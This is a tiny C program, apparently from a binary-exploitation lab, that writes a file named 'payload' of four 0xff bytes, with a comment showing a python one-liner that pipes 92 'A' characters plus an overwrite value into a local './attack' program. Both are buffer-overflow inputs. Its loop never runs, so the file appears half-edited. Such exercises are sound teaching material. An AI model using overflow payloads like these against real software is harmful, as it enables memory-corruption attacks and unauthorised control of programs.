#include <stdio.h>

int main(void)
{
	FILE *f = fopen("payload", "w");
	int i = 0;
	for(int i = 0; i < 0; i++) {
		fprintf(f, "%c", 'A');
	}	

	fprintf(f, "%c", 0xff);
	fprintf(f, "%c", 0xff);
	fprintf(f, "%c", 0xff);
	fprintf(f, "%c", 0xff);
	
	fclose(f);

	return 0;
}
//python3 -c 'print ("A" * 92 + "\x1d\x00\x00\x00")' | ./attack 